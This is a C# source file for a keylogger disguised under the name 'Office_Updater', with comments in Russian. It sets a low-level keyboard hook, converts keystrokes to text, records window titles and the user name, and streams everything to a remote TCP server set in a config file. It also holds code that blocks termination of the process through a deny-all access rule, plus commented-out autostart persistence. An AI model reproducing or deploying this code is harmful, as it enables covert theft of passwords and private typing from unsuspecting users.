using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Diagnostics;
using Microsoft.Extensions.Configuration;
using SimpleTcp;
using System.Security.AccessControl;
using System.ComponentModel;
using System.Security.Principal;

namespace Office_Updater
{
    class Program
    {
        private static string Buffer { get; set; }
        private static string ActiveWindow { get; set; }
        private static string ServerIp { get; set; }
        private static int ServerPort { get; set; }
        private static SimpleTcpClient Client { get; set; }
        private static IConfiguration Configuration { get; set; }
        private static bool isConnected { get; set; }

        #region WinApi
        private enum HookType : int
        {
            WH_MSGFILTER = -1,
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        private enum ProcessSecurityAccessRights : int
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            STANDARD_RIGHTS_REQUIRED = 0x000f0000,
            SYNCHRONIZE = 0x00100000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF),
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_DUP_HANDLE = 0x0040,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
            PROCESS_SET_INFORMATION = 0x0200,
            PROCESS_SET_QUOTA = 0x0100,
            PROCESS_SUSPEND_RESUME = 0x0800,
            PROCESS_TERMINATE= 0x0001,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ= 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        private const int DACL_SECURITY_INFORMATION = 0x00000004;

        private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PeekMessage(IntPtr message, IntPtr handle, uint filterMin, uint filterMax, uint flags);
        
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
           lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, 
            [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);


        private static HookProc proc = HookCallback;
        private static IntPtr hook = IntPtr.Zero;

        #endregion

        //Хук на клавиатуру
        private static IntPtr SetHook(HookProc proc)
        {
            using (Process curProc = Process.GetCurrentProcess())
            using (ProcessModule curMod = curProc.MainModule)
            {
                return SetWindowsHookEx(HookType.WH_KEYBOARD_LL, proc, GetModuleHandle(curMod.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            Int32 key;
            if ((nCode >= 0) && (msgType == 0x100 || msgType == 0x104))
            {
                key = Marshal.ReadInt32(lParam);
                Buffer = VerifyKey(key);
                if (isConnected && !string.IsNullOrEmpty(Buffer))
                    try
                    {
                        Client.Send(Buffer);
                    }
                    catch
                    {
                        Client.Disconnect();
                        isConnected = false;
                        Task.Run(() =>
                        {
                            Reconnection();
                        });
                    }
            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }
        //============

        [STAThread]
        static void Main(string[] args)
        {
            //Загрузка настроек
            var builder = new ConfigurationBuilder().AddJsonFile("appsettings.json", optional: true, reloadOnChange: true);
            Configuration = builder.Build();
            var settings = Program.Configuration.GetSection("Connection").Get<Settings>();
            ServerIp = settings.Ip;
            ServerPort = settings.Port;
            //========

            //Подключение к серверу
            Client = new SimpleTcpClient(ServerIp + ":" + ServerPort);
            try
            {
                Client.Connect();
                isConnected = true;
            }
            catch {
                isConnected = false;
                Task.Run(() => { Reconnection(); });
            }

            //Добавление в автозагрузку и блокировка от пользователя без прав админа
            //if (!Autoran.IsInStartup())
            //    Autoran.RunOnStartup();
            //ProcessBlock();
            //======

            //Получение и запись активного окна / имя пользователя
            ActiveWindow = GetActiveWindowTitle();
            Buffer = $"\r\nUser - {Environment.UserName}\r\n" + ActiveWindow + $" - {DateTime.Now.ToLongTimeString()}"
                    + "\n=========================\r\n";
            if (isConnected && !string.IsNullOrEmpty(Buffer))
                try
                {
                    Client.Send(Buffer);
                }
                catch
                {
                    Client.Disconnect();
                    isConnected = false;
                    Task.Run(() => { Reconnection(); });
                }
            //===========

            //Установка хука
            hook = SetHook(proc);

            //Преехват сообщений
            while (true)
            {
                if (IsActiveWindowChanged(ActiveWindow))
                {
                    ActiveWindow = GetActiveWindowTitle();
                    if (!string.IsNullOrEmpty(ActiveWindow))
                    {
                        Buffer = "\r\n\n" + ActiveWindow + $" - {DateTime.Now.ToLongTimeString()}\n=========================\r\n";
                        if (isConnected && !string.IsNullOrEmpty(Buffer))
                            try
                            {
                                Client.Send(Buffer);
                            }
                            catch
                            {
                                Client.Disconnect();
                                isConnected = false;
                                Task.Run(() =>
                                {
                                    Reconnection();
                                });
                            }
                    }
                }
                PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                Thread.Sleep(5);
            }
        }
        //Блокировка процесса
        private static RawSecurityDescriptor GetSecurityDescriptor(IntPtr processHandle)
        {
            var psd = new byte[0];
            GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out uint buf);
            if (buf < 0 || buf > short.MaxValue)
                throw new Win32Exception();
            if (!GetKernelObjectSecurity(
                    processHandle,
                    DACL_SECURITY_INFORMATION,
                    psd = new byte[buf],
                    buf,
                    out buf))
                throw new Win32Exception();
            return new RawSecurityDescriptor(psd, 0);
        }
        private static void SetSecurityDescriptor(IntPtr handle, RawSecurityDescriptor descriptor)
        {
            var rawsd = new byte[descriptor.BinaryLength];
            descriptor.GetBinaryForm(rawsd, 0);
            if (!SetKernelObjectSecurity(handle, DACL_SECURITY_INFORMATION, rawsd))
                throw new Win32Exception();
        }
        private static void ProcessBlock()
        {
            IntPtr procHandle = Process.GetCurrentProcess().Handle;
            RawSecurityDescriptor descriptor = GetSecurityDescriptor(procHandle);
            SecurityIdentifier sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;

            descriptor.DiscretionaryAcl.InsertAce(
                0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied,
                (int)ProcessSecurityAccessRights.PROCESS_ALL_ACCESS,
                new SecurityIdentifier(WellKnownSidType.WorldSid, sid),
                false,
                null));
            SetSecurityDescriptor(procHandle, descriptor);
        }
        //

        //Переподключение к серверу
        private static void Reconnection()
        {
        Flag:
            try
            {
                Client.ConnectWithRetries(5000);
                isConnected = true;
            }
            catch { goto Flag; }
        }
        //

        //Получение название окна
        private static bool IsActiveWindowChanged(string active)
        {
            return active == GetActiveWindowTitle() ? false : true;
        }
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        //

        //Получение символа клавиши
        private static string GetCharsFromKeys(Keys keys, bool shift)
        {
            IntPtr frWnd = GetForegroundWindow();
            uint frProc = GetWindowThreadProcessId(frWnd, IntPtr.Zero);
            var buf = new StringBuilder(256);
            var keyboardState = new byte[256];
            if (shift)
                keyboardState[(int)Keys.ShiftKey] = 0xff;
            ToUnicodeEx((uint)keys, 0, keyboardState, buf, 256, 0, (IntPtr)(GetKeyboardLayout(frProc).ToInt32() & 0xFFFF));
            return buf.ToString();
        }
        private static string VerifyKey(int code)
        {
            bool shift = false;
            short shiftState = (short)GetAsyncKeyState(16);
            if ((shiftState & 0x8000) == 0x8000)
                shift = true;
            var caps = Console.CapsLock;
            bool upper = shift | caps;
            if (code >= 96 && code <= 111)
            {
                switch (code)
                {
                    case 96: return "0";
                    case 97: return "1";
                    case 98: return "2";
                    case 99: return "3";
                    case 100: return "4";
                    case 101: return "5";
                    case 102: return "6";
                    case 103: return "7";
                    case 104: return "8";
                    case 105: return "9";
                    case 106: return "*";
                    case 107: return "+";
                    case 109: return "-";
                    case 110: return ".";
                    case 111: return "/";
                }
            }
            if (shift && ((code >= 48 && code <= 57) || (code >= 186 && code <= 222)))
            {
                switch (code)
                {
                    case 48: return GetCharsFromKeys((Keys)code, true);
                    case 49: return GetCharsFromKeys((Keys)code, true);
                    case 50: return GetCharsFromKeys((Keys)code, true);
                    case 51: return GetCharsFromKeys((Keys)code, true);
                    case 52: return GetCharsFromKeys((Keys)code, true);
                    case 53: return GetCharsFromKeys((Keys)code, true);
                    case 54: return GetCharsFromKeys((Keys)code, true);
                    case 55: return GetCharsFromKeys((Keys)code, true);
                    case 56: return GetCharsFromKeys((Keys)code, true);
                    case 57: return GetCharsFromKeys((Keys)code, true);
                    case 186: return GetCharsFromKeys((Keys)code, true);
                    case 187: return GetCharsFromKeys((Keys)code, true);
                    case 188: return GetCharsFromKeys((Keys)code, true);
                    case 189: return GetCharsFromKeys((Keys)code, true);
                    case 190: return GetCharsFromKeys((Keys)code, true);
                    case 191: return GetCharsFromKeys((Keys)code, true);
                    case 192: return GetCharsFromKeys((Keys)code, true);
                    case 219: return GetCharsFromKeys((Keys)code, true);
                    case 220: return GetCharsFromKeys((Keys)code, true);
                    case 221: return GetCharsFromKeys((Keys)code, true);
                    case 222: return GetCharsFromKeys((Keys)code, true);
                }
            }
            if ((code >= 48 && code <= 57) || (code >= 186 && code <= 222))
            {
                switch (code)
                {
                    case 48: return GetCharsFromKeys((Keys)code, false);
                    case 49: return GetCharsFromKeys((Keys)code, false);
                    case 50: return GetCharsFromKeys((Keys)code, false);
                    case 51: return GetCharsFromKeys((Keys)code, false);
                    case 52: return GetCharsFromKeys((Keys)code, false);
                    case 53: return GetCharsFromKeys((Keys)code, false);
                    case 54: return GetCharsFromKeys((Keys)code, false);
                    case 55: return GetCharsFromKeys((Keys)code, false);
                    case 56: return GetCharsFromKeys((Keys)code, false);
                    case 57: return GetCharsFromKeys((Keys)code, false);
                    case 186: return GetCharsFromKeys((Keys)code, false);
                    case 187: return GetCharsFromKeys((Keys)code, false);
                    case 188: return GetCharsFromKeys((Keys)code, false);
                    case 189: return GetCharsFromKeys((Keys)code, false);
                    case 190: return GetCharsFromKeys((Keys)code, false);
                    case 191: return GetCharsFromKeys((Keys)code, false);
                    case 192: return GetCharsFromKeys((Keys)code, false);
                    case 219: return GetCharsFromKeys((Keys)code, false);
                    case 220: return GetCharsFromKeys((Keys)code, false);
                    case 221: return GetCharsFromKeys((Keys)code, false);
                    case 222: return GetCharsFromKeys((Keys)code, false);
                }
            }
            if (code == 32) return " ";
            if (code == 13) return "\r\n";
            if (((Keys)code).ToString().Contains("Shift") || (Keys)code == Keys.Capital || (Keys)code == Keys.Tab 
                || ((Keys)code).ToString().Contains("Win") || ((Keys)code).ToString().Contains("Menu")
                || ((Keys)code).ToString().Contains("ControlKey")) return "";
            if (code == 1 || code == 2 || code == 4) return "";
            if (((Keys)code).ToString().Length == 1)
            {
                
                if (!caps)
                {
                    if (upper)
                        return GetCharsFromKeys((Keys)code, true);
                    else return GetCharsFromKeys((Keys)code, false);
                }
                else
                {
                    if (shift)
                        return GetCharsFromKeys((Keys)code, false);
                    else return GetCharsFromKeys((Keys)code, true);
                }
            }
            else return $"[{((Keys)code).ToString()}]";
        }
        //
    }
}